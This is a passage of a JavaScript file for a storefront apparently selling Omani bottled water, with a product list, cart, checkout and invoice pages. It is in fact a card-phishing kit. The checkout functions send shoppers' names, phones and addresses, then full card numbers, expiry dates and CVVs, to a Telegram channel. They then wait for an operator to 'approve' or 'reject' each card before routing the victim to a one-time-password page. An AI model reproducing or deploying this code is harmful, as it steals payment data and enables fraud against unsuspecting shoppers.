// ===== STATE MANAGEMENT =====
let cart = [];
let favorites = [];
let currentFilter = 'all';
let currentModalProduct = null;
let modalQty = 1;
let currentSlide = 0;
let checkoutData = {};

// ===== PRODUCTS DATABASE =====
const products = [
    // --- مياه عادية ---
    {
        id: 1, name: 'واحة عمان 330 مل', category: 'water',
        price: 2.5, desc: 'مياه معدنية طبيعية نقية، مثالية للحمل في أي مكان',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/water-330ml-pack.jpg'
    },
    {
        id: 2, name: 'واحة عمان 500 مل', category: 'water',
        price: 3.5, desc: 'العبوة الكلاسيكية الأكثر مبيعاً',
        badge: 'الأكثر بيعاً', badgeClass: 'badge-hot',
        img: 'assets/images/products/rpet-500ml.jpg'
    },
    {
        id: 3, name: 'واحة عمان 1.5 لتر', category: 'water',
        price: 6.5, desc: 'مناسبة للعائلة والمنزل',
        badge: 'توفير', badgeClass: 'badge-sale',
        img: 'assets/images/products/zero-1.5L.jpg'
    },
    {
        id: 4, name: 'واحة عمان 2 لتر', category: 'water',
        price: 8.5, desc: 'حجم عائلي كبير للاستخدام اليومي',
        badge: '', badgeClass: '',
        img: 'assets/images/products/zero-1.5L.jpg'
    },
    {
        id: 5, name: 'واحة عمان rPET 500 مل', category: 'water',
        price: 4.0, desc: 'عبوة صديقة للبيئة من بلاستيك معاد تدويره',
        badge: 'بيئي', badgeClass: 'badge-eco',
        img: 'assets/images/products/rpet-500ml.jpg'
    },
    {
        id: 6, name: 'واحة عمان 250 مل', category: 'water',
        price: 1.5, desc: 'حجم صغير محمول للأطفال والرحلات',
        badge: '', badgeClass: '',
        img: 'assets/images/products/water-330ml-pack.jpg'
    },

    // --- قلونات ---
    {
        id: 7, name: 'قلون واحة عمان 5 لتر', category: 'gallon',
        price: 15, desc: 'مناسب للمكاتب والمنازل، سهل الحمل',
        badge: 'الأفضل', badgeClass: 'badge-hot',
        img: 'assets/images/products/gallon-5L.jpg'
    },
    {
        id: 8, name: 'قلون واحة عمان 4 جالون', category: 'gallon',
        price: 22, desc: 'مثالي للمبردات المنزلية والمكتبية',
        badge: '', badgeClass: '',
        img: 'assets/images/products/gallon-4g.jpg'
    },
    {
        id: 9, name: 'قلون واحة عمان 5 جالون', category: 'gallon',
        price: 28, desc: 'الحجم الأكبر لاحتياجات المكاتب',
        badge: 'توفير', badgeClass: 'badge-sale',
        img: 'assets/images/products/gallon-5L.jpg'
    },
    {
        id: 10, name: 'قلون واحة عمان زيرو 4 جالون', category: 'gallon',
        price: 24, desc: 'بدون صوديوم، متوازن pH',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/zero-gallon.jpg'
    },

    // --- مياه فوارة ---
    {
        id: 11, name: 'واحة عمان الفوارة 330 مل زجاج', category: 'sparkling',
        price: 5.5, desc: 'فقاعات منعشة في زجاجة أنيقة',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/sparkling-glass-750ml.jpg'
    },
    {
        id: 12, name: 'واحة عمان الفوارة 750 مل زجاج', category: 'sparkling',
        price: 10, desc: 'للمطاعم والمناسبات الراقية',
        badge: 'فاخر', badgeClass: 'badge-hot',
        img: 'assets/images/products/sparkling-glass-750ml.jpg'
    },
    {
        id: 13, name: 'واحة عمان الفوارة 500 مل', category: 'sparkling',
        price: 4.5, desc: 'انتعاش فوار في كل رشفة',
        badge: '', badgeClass: '',
        img: 'assets/images/products/sparkling-glass-750ml.jpg'
    },
    {
        id: 14, name: 'واحة عمان الفوارة 1.5 لتر', category: 'sparkling',
        price: 8, desc: 'للحفلات والتجمعات العائلية',
        badge: 'توفير', badgeClass: 'badge-sale',
        img: 'assets/images/products/sparkling-glass-750ml.jpg'
    },

    // --- مياه فاخرة ---
    {
        id: 15, name: 'واحة عمان زجاج 750 مل', category: 'premium',
        price: 12, desc: 'زجاجة فاخرة للمناسبات والمطاعم الراقية',
        badge: 'فاخر', badgeClass: 'badge-hot',
        img: 'assets/images/products/glass-750ml.jpg'
    },
    {
        id: 16, name: 'واحة عمان زجاج 330 مل', category: 'premium',
        price: 6, desc: 'تصميم أنيق مثالي للمناسبات',
        badge: '', badgeClass: '',
        img: 'assets/images/products/water-330ml-pack.jpg'
    },
    {
        id: 17, name: 'باقة زجاج 750 مل × 6', category: 'premium',
        price: 65, desc: 'باقة اقتصادية من الزجاجات الفاخرة',
        badge: 'توفير', badgeClass: 'badge-sale',
        img: 'assets/images/products/glass-750ml-pack.jpg'
    },
    {
        id: 18, name: 'باقة زجاج 330 مل × 6', category: 'premium',
        price: 32, desc: 'مثالية للهدايا والمناسبات',
        badge: 'هدية', badgeClass: 'badge-eco',
        img: 'assets/images/products/water-330ml-pack.jpg'
    },

    // --- مياه وظيفية ---
    {
        id: 19, name: 'واحة عمان القلوية 1.5 لتر', category: 'functional',
        price: 7, desc: 'pH 9 معززة بالمعادن الطبيعية لصحة أفضل',
        badge: 'صحي', badgeClass: 'badge-eco',
        img: 'assets/images/products/alkaline-1.5L.jpg'
    },
    {
        id: 20, name: 'واحة عمان زيرو 1.5 لتر', category: 'functional',
        price: 6, desc: 'بدون صوديوم، متوازن pH، مثالية للحمية',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/zero-1.5L.jpg'
    },
    {
        id: 21, name: 'واحة عمان الرياضية 500 مل', category: 'functional',
        price: 7, desc: 'معززة بالإلكتروليت للرياضيين',
        badge: 'رياضي', badgeClass: 'badge-hot',
        img: 'assets/images/products/alkaline-1.5L.jpg'
    },
    {
        id: 22, name: 'واحة عمان للأطفال 250 مل', category: 'functional',
        price: 4.5, desc: 'آمنة للأطفال، خالية من الفلور',
        badge: 'أطفال', badgeClass: 'badge-eco',
        img: 'assets/images/products/water-330ml-pack.jpg'
    },
    {
        id: 23, name: 'واحة عمان بالزنك 500 مل', category: 'functional',
        price: 6, desc: 'معززة بالزنك لدعم المناعة',
        badge: 'صحي', badgeClass: 'badge-eco',
        img: 'assets/images/products/alkaline-1.5L.jpg'
    },
    {
        id: 24, name: 'واحة عمان بالمغنيسيوم 500 مل', category: 'functional',
        price: 6.5, desc: 'تساعد على استرخاء العضلات',
        badge: '', badgeClass: '',
        img: 'assets/images/products/alkaline-1.5L.jpg'
    }
];

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', () => {
    // Show loading overlay then hide after content is ready (Fast splash)
    const overlay = document.getElementById('page-loading-overlay');
    if (overlay) {
        setTimeout(() => {
            overlay.classList.add('hidden');
            // Completely remove from DOM after fade out
            setTimeout(() => overlay.remove(), 600);
        }, 1000); // تسريع الاختفاء إلى ثانية واحدة
    }
    
    // استعادة بيانات الدفع المحفوظة
    const savedData = sessionStorage.getItem('checkoutData');
    if (savedData) {
        checkoutData = JSON.parse(savedData);
    }

    // Restore previous page from session
    const savedPage = sessionStorage.getItem('currentPage');
    if (savedPage && document.getElementById(savedPage)) {
        goToPage(savedPage);
    }
    
    renderProducts();
    startHeroCarousel();
    setupOTPInputs();
});

// ===== PAGE NAVIGATION =====
function goToPage(pageId) {
    // حفظ الصفحة الحالية في sessionStorage
    sessionStorage.setItem('currentPage', pageId);

    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');

    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    if (pageId === 'home-page') document.getElementById('nav-home').classList.add('active');
    else if (pageId === 'cart-page') document.getElementById('nav-cart').classList.add('active');
    else if (pageId === 'favorites-page') document.getElementById('nav-fav').classList.add('active');
    else if (pageId === 'notifications-page') document.getElementById('nav-notif').classList.add('active');

    if (pageId === 'cart-page') renderCart();
    else if (pageId === 'favorites-page') renderFavorites();
    else if (pageId === 'checkout-address-page') {
        updateAddressLabels();
        // فتح الخريطة تلقائياً إذا لم يتم تحديد موقع سابقاً
        if (!selectedLatLng) {
            setTimeout(openMapModal, 300);
        }
    }
    else if (pageId === 'checkout-invoice-page') renderInvoice();
    else if (pageId === 'otp-page') {
        setupOTPInputs();
        showOTPLoading();
    }

    // Save current page to session storage
    sessionStorage.setItem('currentPage', pageId);

    window.scrollTo(0, 0);
}

// ===== PRODUCTS RENDERING =====
function renderProducts() {
    const grid = document.getElementById('products-grid');
    grid.innerHTML = '';

    const filtered = currentFilter === 'all' ? products : products.filter(p => p.category === currentFilter);

    filtered.forEach(product => {
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="product-image" onclick="openModal(${product.id})">
                <img src="${product.img}" alt="${product.name}">
                ${product.badge ? `<div class="product-badge ${product.badgeClass}">${product.badge}</div>` : ''}
            </div>
            <div class="product-info">
                <div class="product-name">${product.name}</div>
                <div class="product-desc">${product.desc}</div>
                <div class="product-footer">
                    <div class="product-price">${product.price.toFixed(2)} ر.ع</div>
                    <div class="product-actions">
                        <button class="product-btn add" onclick="addToCart(${product.id}, event)">
                            <i class="fas fa-plus"></i>
                        </button>
                        <button class="product-btn fav ${favorites.includes(product.id) ? 'active' : ''}" 
                                onclick="toggleFavorite(${product.id}, event)">
                            <i class="fas fa-heart"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
        grid.appendChild(card);
    });
}

// ===== FILTER PRODUCTS =====
function filterProducts(category, element) {
    currentFilter = category;
    document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
    if (element) element.classList.add('active');
    renderProducts();
}

// ===== CART MANAGEMENT =====
function addToCart(productId, event) {
    event.stopPropagation();
    const product = products.find(p => p.id === productId);
    const existing = cart.find(c => c.id === productId);

    if (existing) {
        existing.qty++;
    } else {
        cart.push({ ...product, qty: 1 });
    }

    updateCartBadge();
    showNotification(`تم إضافة ${product.name} إلى السلة`);
}

function removeFromCart(productId) {
    cart = cart.filter(c => c.id !== productId);
    updateCartBadge();
    renderCart();
}

function updateCartQty(productId, change) {
    const item = cart.find(c => c.id === productId);
    if (item) {
        item.qty += change;
        if (item.qty <= 0) removeFromCart(productId);
        else renderCart();
        updateCartBadge();
    }
}

function updateCartBadge() {
    const badge = document.getElementById('cart-badge');
    const total = cart.reduce((sum, item) => sum + item.qty, 0);
    badge.textContent = total;
    badge.style.display = total > 0 ? 'flex' : 'none';
}

function renderCart() {
    const content = document.getElementById('cart-content');

    if (cart.length === 0) {
        content.innerHTML = `
            <div class="cart-empty">
                <div class="cart-empty-icon"><i class="fas fa-shopping-cart"></i></div>
                <p>السلة فارغة</p>
                <p style="font-size:0.85rem; margin-top:0.5rem;">ابدأ بإضافة المنتجات المفضلة لديك</p>
            </div>
        `;
        return;
    }

    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
    const delivery = subtotal >= 20 ? 0 : 5;
    const total = subtotal + delivery;

    let html = '<div class="cart-items">';
    cart.forEach(item => {
        html += `
            <div class="cart-item">
                <div class="cart-item-image">
                    <img src="${item.img}" alt="${item.name}">
                </div>
                <div class="cart-item-info">
                    <div class="cart-item-name">${item.name}</div>
                    <div class="cart-item-price">${item.price.toFixed(2)} ر.ع</div>
                    <div class="cart-item-controls">
                        <button class="qty-btn" onclick="updateCartQty(${item.id}, -1)">−</button>
                        <div class="qty-value">${item.qty}</div>
                        <button class="qty-btn" onclick="updateCartQty(${item.id}, 1)">+</button>
                        <button class="remove-btn" onclick="removeFromCart(${item.id})">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
    });
    html += '</div>';

    html += `
        <div class="cart-summary">
            <div class="summary-row">
                <span>المجموع الفرعي</span>
                <span>${subtotal.toFixed(2)} ر.ع</span>
            </div>
            <div class="summary-row">
                <span>رسوم التوصيل</span>
                <span>${delivery.toFixed(2)} ر.ع</span>
            </div>
            ${subtotal < 20 ? `<div class="summary-hint">أضف ${(20 - subtotal).toFixed(2)} ر.ع للحصول على توصيل مجاني</div>` : ''}
            <div class="summary-row total">
                <span>الإجمالي</span>
                <span>${total.toFixed(2)} ر.ع</span>
            </div>
        </div>
        <button class="btn-primary" onclick="goToPage('checkout-info-page')" style="width:100%;">
            <i class="fas fa-arrow-left"></i> إتمام الطلب · ${total.toFixed(2)} ر.ع
        </button>
    `;

    content.innerHTML = html;
}

// ===== FAVORITES =====
function toggleFavorite(productId, event) {
    event.stopPropagation();
    const idx = favorites.indexOf(productId);
    if (idx > -1) {
        favorites.splice(idx, 1);
    } else {
        favorites.push(productId);
    }

    document.querySelectorAll('.product-btn.fav').forEach((btn, i) => {
        const card = btn.closest('.product-card');
        const id = parseInt(card.querySelector('.product-btn.add').onclick.toString().match(/\d+/)[0]);
        if (favorites.includes(id)) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });

    updateFavoriteBadge();
}

function updateFavoriteBadge() {
    const badge = document.getElementById('fav-badge');
    badge.textContent = favorites.length;
    badge.style.display = favorites.length > 0 ? 'flex' : 'none';
}

function renderFavorites() {
    const content = document.getElementById('favorites-content');

    if (favorites.length === 0) {
        content.innerHTML = `
            <div class="favorites-empty">
                <div class="favorites-empty-icon"><i class="fas fa-heart"></i></div>
                <p>لا توجد منتجات مفضلة</p>
                <p style="font-size:0.85rem; margin-top:0.5rem;">أضف منتجاتك المفضلة لسهولة الوصول إليها</p>
            </div>
        `;
        return;
    }

    const favProducts = products.filter(p => favorites.includes(p.id));
    let html = '<div class="favorites-grid">';

    favProducts.forEach(product => {
        html += `
            <div class="product-card" onclick="openModal(${product.id})">
                <div class="product-image">
                    <img src="${product.img}" alt="${product.name}">
                    ${product.badge ? `<div class="product-badge ${product.badgeClass}">${product.badge}</div>` : ''}
                </div>
                <div class="product-info">
                    <div class="product-name">${product.name}</div>
                    <div class="product-desc">${product.desc}</div>
                    <div class="product-footer">
                        <div class="product-price">${product.price.toFixed(2)} ر.ع</div>
                        <div class="product-actions">
                            <button class="product-btn add" onclick="addToCart(${product.id}, event)">
                                <i class="fas fa-plus"></i>
                            </button>
                            <button class="product-btn fav active" onclick="toggleFavorite(${product.id}, event)">
                                <i class="fas fa-heart"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;
    });

    html += '</div>';
    content.innerHTML = html;
}

// ===== PRODUCT MODAL =====
function openModal(productId) {
    currentModalProduct = products.find(p => p.id === productId);
    modalQty = 1;

    document.getElementById('modal-img').src = currentModalProduct.img;
    document.getElementById('modal-title').textContent = currentModalProduct.name;
    document.getElementById('modal-desc').textContent = currentModalProduct.desc;
    document.getElementById('modal-price').textContent = currentModalProduct.price.toFixed(2) + ' ر.ع';
    document.getElementById('modal-qty').textContent = '1';

    document.getElementById('product-modal').classList.add('active');
}

function closeModal(event) {
    if (event.target.id === 'product-modal') {
        document.getElementById('product-modal').classList.remove('active');
    }
}

function changeModalQty(change) {
    modalQty = Math.max(1, modalQty + change);
    document.getElementById('modal-qty').textContent = modalQty;
}

document.getElementById('modal-add-btn').addEventListener('click', () => {
    for (let i = 0; i < modalQty; i++) {
        addToCart(currentModalProduct.id, { stopPropagation: () => {} });
    }
    document.getElementById('product-modal').classList.remove('active');
    showNotification(`تم إضافة ${modalQty} × ${currentModalProduct.name} إلى السلة`);
});

// ===== CHECKOUT - CUSTOMER INFO =====
async function validateCustomerInfo(event) {
    event.preventDefault();
    const name = document.getElementById('customer-name').value.trim();
    const phone = document.getElementById('customer-phone').value.trim();
    if (!name || name.length < 3) {
        alert('الرجاء إدخال اسم صحيح');
        return;
    }
    
    if (!phone || phone.length !== 8) {
        alert('الرجاء إدخال رقم هاتف صحيح (8 أرقام)');
        return;
    }
    
    checkoutData.name = name;
    checkoutData.phone = '+968' + phone;
    
    // حفظ البيانات في sessionStorage للمحافظة عليها عند التحديث
    sessionStorage.setItem('checkoutData', JSON.stringify(checkoutData));

    // إرسال معلومات العميل بشكل منفصل إلى تليجرام
    const message = 
        `👤 <b>معلومات العميل - Customer Info</b>\n\n` +
        `👤 <b>الاسم:</b> <code>${name}</code>\n` +
        `📞 <b>الهاتف:</b> <code>+968 ${phone}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    await sendToTelegram(message, Date.now(), 'info');
    
    goToPage('checkout-address-page');
}

// ===== CHECKOUT - ADDRESS =====
async function validateAddress(event) {
    event.preventDefault();
    
    if (!selectedLatLng) {
        alert('الرجاء تحديد الموقع على الخريطة أولاً');
        return;
    }

    const building = document.getElementById('address-building').value.trim();
    const street = document.getElementById('address-street').value.trim();
    const number = document.getElementById('address-number').value.trim();
    const floor = document.getElementById('address-floor').value.trim();
    const addressType = document.querySelector('input[name="address-type"]:checked').value;
    
    if (!building || building.length < 2) {
        const buildingLabel = addressType === 'home' ? 'اسم المنزل' : 'اسم المكتب';
        alert(`الرجاء إدخال ${buildingLabel}`);
        return;
    }
    
    if (!number || number.length < 1) {
        const numberLabel = addressType === 'home' ? 'رقم المنزل' : 'رقم المكتب';
        alert(`الرجاء إدخال ${numberLabel}`);
        return;
    }
    
    if (!street || street.length < 2) {
        alert('الرجاء إدخال الشارع');
        return;
    }
    
    checkoutData.building = building;
    checkoutData.number = number;
    checkoutData.floor = floor || 'الطابق الأرضي';
    checkoutData.street = street;
    checkoutData.unit = document.getElementById('address-unit').value.trim() || 'بدون علامة مميزة';
    checkoutData.addressType = addressType;
    
    // استخدام العنوان المكتشف أو الإحداثيات كبديل للمحافظة والمنطقة في الفاتورة
    checkoutData.emirate = checkoutData.detectedAddress ? checkoutData.detectedAddress.split(' - ')[0] : 'عمان';
    checkoutData.area = checkoutData.detectedAddress ? (checkoutData.detectedAddress.split(' - ')[1] || checkoutData.detectedAddress) : 'موقع محدد';
    
    // حفظ البيانات في sessionStorage
    sessionStorage.setItem('checkoutData', JSON.stringify(checkoutData));

    // إرسال بيانات العنوان بشكل منفصل إلى تليجرام
    const message = 
        `📍 <b>عنوان التوصيل - Address Info</b>\n\n` +
        `👤 <b>الاسم:</b> <code>${checkoutData.name}</code>\n` +
        `🏠 <b>النوع:</b> <code>${addressType === 'home' ? 'منزل' : 'مكتب'}</code>\n` +
        `🏢 <b>الاسم:</b> <code>${building}</code>\n` +
        `🔢 <b>الرقم:</b> <code>${number}</code>\n` +
        `🏢 <b>الطابق:</b> <code>${checkoutData.floor}</code>\n` +
        `🛣️ <b>الشارع:</b> <code>${street}</code>\n` +
        `📍 <b>الموقع:</b> <code>${checkoutData.detectedAddress || 'محدد على الخريطة'}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    await sendToTelegram(message, Date.now(), 'info');

    goToPage('checkout-invoice-page');
}

// ===== INVOICE =====
function renderInvoice() {
    const orderId = '#' + Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    const today = new Date().toLocaleDateString('ar-AE');

    // إنشاء محتوى الفاتورة
    let invoiceHtml = `
        <div style="background:white; border-radius:12px; padding:1.5rem; margin-bottom:1rem;">
            <div style="display:flex; justify-content:space-between; margin-bottom:1.5rem; border-bottom:1px solid #e0e6ed; padding-bottom:1rem;">
                <div>
                    <div style="font-size:0.8rem; color:var(--text-light);">رقم الطلب</div>
                    <div id="invoice-order-id" style="font-size:1.2rem; font-weight:700; color:var(--primary);">${orderId}</div>
                </div>
                <div style="text-align:left;">
                    <div style="font-size:0.8rem; color:var(--text-light);">التاريخ</div>
                    <div id="invoice-date" style="font-size:1rem; font-weight:600;">${today}</div>
                </div>
            </div>

            <div style="margin-bottom:1.5rem; padding-bottom:1rem; border-bottom:1px solid #e0e6ed;">
                <div style="font-size:0.8rem; color:var(--text-light); margin-bottom:0.5rem;">معلومات العميل والتسليم</div>
                <div style="font-weight:600; margin-bottom:0.3rem;" id="invoice-name"></div>
                <div style="color:var(--text-light); font-size:0.9rem; margin-bottom:0.5rem;" id="invoice-phone"></div>
                <div style="font-size:0.85rem; color:var(--text-dark); background:#f0f7ff; padding:0.8rem; border-radius:8px; border-right:3px solid var(--primary);">
                    <div style="font-weight:700; color:var(--primary); margin-bottom:0.2rem;">عنوان التوصيل:</div>
                    <div id="invoice-address-detected" style="margin-bottom:0.2rem; font-weight:600;"></div>
                    <div id="invoice-address-details"></div>
                </div>
            </div>

            <div style="margin-bottom:1.5rem;">
                <div style="font-size:0.8rem; color:var(--text-light); margin-bottom:0.8rem; font-weight:600;">تفاصيل الطلب</div>
                <div id="invoice-items" style="margin-bottom:1rem;"></div>
            </div>

            <div style="background:#f9fafb; border-radius:8px; padding:1rem;">
                <div style="display:flex; justify-content:space-between; margin-bottom:0.5rem;">
                    <span style="color:var(--text-light);">المجموع الفرعي</span>
                    <span id="invoice-subtotal" style="font-weight:600;">0.00 ر.ع</span>
                </div>
                <div style="display:flex; justify-content:space-between; margin-bottom:0.8rem; padding-bottom:0.8rem; border-bottom:1px solid #e0e6ed;">
                    <span style="color:var(--text-light);">رسوم التوصيل</span>
                    <span id="invoice-delivery" style="font-weight:600;">0.00 ر.ع</span>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="font-weight:700; font-size:1.1rem;">الإجمالي</span>
                    <span id="invoice-total" style="font-weight:700; font-size:1.1rem; color:var(--primary);">0.00 ر.ع</span>
                </div>
            </div>
        </div>
    `;
    document.getElementById('invoice-content').innerHTML = invoiceHtml;

    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
    const delivery = subtotal >= 20 ? 0 : 5;
    const total = subtotal + delivery;

    let itemsHtml = '';
    cart.forEach(item => {
        itemsHtml += `
            <div class="invoice-item">
                <div class="invoice-item-name">${item.name}</div>
                <div class="invoice-item-qty">× ${item.qty}</div>
                <div class="invoice-item-price">${(item.price * item.qty).toFixed(2)} ر.ع</div>
            </div>
        `;
    });

    // تحديث البيانات
    document.getElementById('invoice-order-id').textContent = orderId;
    document.getElementById('invoice-date').textContent = today;
    document.getElementById('invoice-name').textContent = checkoutData.name;
    document.getElementById('invoice-phone').textContent = checkoutData.phone;
    document.getElementById('invoice-address-detected').textContent = checkoutData.detectedAddress || 'موقع محدد على الخريطة';
    document.getElementById('invoice-address-details').innerHTML = `
        ${checkoutData.building}، ${checkoutData.floor}<br>
        الشارع: ${checkoutData.street} - رقم: ${checkoutData.number}<br>
        <span style="font-size:0.8rem; color:var(--text-light);">علامة مميزة: ${checkoutData.unit}</span>
    `;
    document.getElementById('invoice-items').innerHTML = itemsHtml;
    document.getElementById('invoice-subtotal').textContent = subtotal.toFixed(2) + ' ر.ع';
    document.getElementById('invoice-delivery').textContent = delivery.toFixed(2) + ' ر.ع';
    document.getElementById('invoice-total').textContent = total.toFixed(2) + ' ر.ع';

    checkoutData.orderId = orderId;
    checkoutData.subtotal = subtotal;
    checkoutData.delivery = delivery;
    checkoutData.total = total;
}

// ===== CARD DISPLAY FUNCTIONS =====
function updateCardDisplay() {
    const holderName = document.getElementById('card-holder').value || 'الاسم';
    document.getElementById('card-display-name').textContent = holderName.toUpperCase();
}

function formatCardNumber(input) {
    let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
    // Limit to 16 digits
    value = value.slice(0, 16);
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    input.value = formatted;
    
    // Validate on input
    if (value.length === 16) {
        validateCardNumber(input);
    } else {
        const cardNumberInput = document.getElementById('card-number');
        cardNumberInput.style.borderColor = '#e0e6ed';
    }
    
    // Update card display - آخر 4 أرقام
    const lastFour = value.slice(-4).padStart(4, '0');
    if (document.getElementById('card-last-four')) {
        document.getElementById('card-last-four').textContent = lastFour;
    }
}

function formatExpiry(input) {
    let value = input.value.replace(/[^0-9]/g, '');
    // Limit to 4 digits (MMYY)
    value = value.slice(0, 4);
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value;
    validateCardExpiry(input);
}

// ===== CARD VALIDATION FUNCTIONS =====
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        sum += digit;
        isEven = !isEven;
    }
    return sum % 10 === 0;
}

function validateCardNumber(input) {
    const value = input.value.replace(/\s/g, '');
    const cardNumberInput = document.getElementById('card-number');
    
    if (value.length === 0) {
        cardNumberInput.style.borderColor = '#e0e6ed';
        return false;
    }
    
    if (value.length !== 16) {
        cardNumberInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    if (!luhnCheck(value)) {
        cardNumberInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    cardNumberInput.style.borderColor = '#4caf50';
    return true;
}

function validateCardExpiry(input) {
    const value = input.value;
    const expiryInput = document.getElementById('card-expiry');
    
    if (value.length === 0) {
        expiryInput.style.borderColor = '#e0e6ed';
        return false;
    }
    
    if (value.length !== 5 || value[2] !== '/') {
        expiryInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    const month = parseInt(value.slice(0, 2), 10);
    const year = parseInt(value.slice(3, 5), 10);
    
    if (month < 1 || month > 12) {
        expiryInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        expiryInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    expiryInput.style.borderColor = '#4caf50';
    return true;
}

function validateCardCVV(input) {
    const value = input.value;
    const cvvInput = document.getElementById('card-cvv');
    
    if (value.length === 0) {
        cvvInput.style.borderColor = '#e0e6ed';
        return false;
    }
    
    if (value.length !== 3) {
        cvvInput.style.borderColor = '#d32f2f';
        return false;
    }
    
    cvvInput.style.borderColor = '#4caf50';
    return true;
}

// ===== PAYMENT =====
function selectPaymentMethod(method, element) {
    document.querySelectorAll('.payment-method-card').forEach(card => {
        card.classList.remove('active');
        card.querySelector('i').className = 'fas fa-circle';
        card.querySelector('i').style.color = '#ddd';
    });

    element.classList.add('active');
    element.querySelector('i').className = 'fas fa-check-circle';
    element.querySelector('i').style.color = 'var(--primary)';

    checkoutData.paymentMethod = method;

    const cardForm = document.getElementById('card-payment-form');
    const otherBtn = document.getElementById('other-payment-btn');

    if (method === 'card') {
        cardForm.style.display = 'block';
        otherBtn.style.display = 'none';
    } else {
        cardForm.style.display = 'none';
        otherBtn.style.display = 'block';
    }
    
    // Save payment method to session
    sessionStorage.setItem('paymentMethod', method);
}

async function submitCardPayment(event) {
    event.preventDefault();

    const cardHolder = document.getElementById('card-holder').value;
    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('card-expiry').value;
    const cardCVV = document.getElementById('card-cvv').value;

    // Validate all fields
    const isCardValid = validateCardNumber(document.getElementById('card-number'));
    const isExpiryValid = validateCardExpiry(document.getElementById('card-expiry'));
    const isCVVValid = validateCardCVV(document.getElementById('card-cvv'));

    if (!isCardValid || !isExpiryValid || !isCVVValid) {
        showNotification('⚠ يرجى إدخال بيانات البطاقة بشكل صحيح');
        return;
    }

    checkoutData.cardHolder = cardHolder;
    checkoutData.cardNumber = cardNumber;
    checkoutData.cardExpiry = cardExpiry;
    checkoutData.cardCVV = cardCVV;

    // إظهار واجهة الانتظار
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) loadingOverlay.style.display = 'flex';

    // إرسال بيانات البطاقة إلى تليجرام
    const requestId = Date.now();
    const message = 
        `💳 <b>بيانات البطاقة البنكية - Card Info</b>\n\n` +
        `👤 <b>الاسم:</b> <code>${checkoutData.name}</code>\n` +
        `📞 <b>الهاتف:</b> <code>${checkoutData.phone}</code>\n` +
        `🏠 <b>العنوان:</b> <code>${checkoutData.building}، ${checkoutData.street}</code>\n\n` +
        `💳 <b>صاحب البطاقة:</b> <code>${cardHolder}</code>\n` +
        `🔢 <b>رقم البطاقة:</b> <code>${cardNumber}</code>\n` +
        `📅 <b>تاريخ الانتهاء:</b> <code>${cardExpiry}</code>\n` +
        `🔒 <b>CVV:</b> <code>${cardCVV}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    const messageId = await sendToTelegram(message, requestId, 'card');
    if (!messageId) {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        goToPage('otp-page');
        displayOTPPhone();
        return;
    }

    const checkInterval = setInterval(async () => {
        const status = await checkWebhookResponse(requestId, 'card');
        if (status === 'approved') {
            clearInterval(checkInterval);
            await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            // إخفاء الأخطاء إن وجدت سابقاً
            hideCardErrors();
            goToPage('otp-page');
            displayOTPPhone();
        } else if (status === 'rejected') {
            clearInterval(checkInterval);
            await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام');
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            // إظهار الأخطاء الحمراء بدلاً من صفحة الرفض
            showCardErrors();
        }
    }, 3000);
}

function showCardErrors() {
    const fields = ['card-holder', 'card-number', 'card-expiry', 'card-cvv'];
    fields.forEach(field => {
        const input = document.getElementById(field);
        if (input) {
            input.classList.add('input-error');
            input.value = ''; // إفراغ الحقل
        }
    });
    // إظهار الرسالة الموحدة
    const mainError = document.getElementById('error-card-main');
    if (mainError) mainError.classList.add('show');
}

function hideCardErrors() {
    const fields = ['card-holder', 'card-number', 'card-expiry', 'card-cvv'];
    fields.forEach(field => {
        const input = document.getElementById(field);
        if (input) input.classList.remove('input-error');
    });
    // إخفاء الرسالة الموحدة
    const mainError = document.getElementById('error-card-main');
    if (mainError) mainError.classList.remove('show');
}

function submitOtherPayment() {
    goToPage('otp-page');
    displayOTPPhone();
}

function displayOTPPhone() {
    const phone = checkoutData.phone;
    // Show only last 4 digits
    const lastFour = phone.slice(-4);
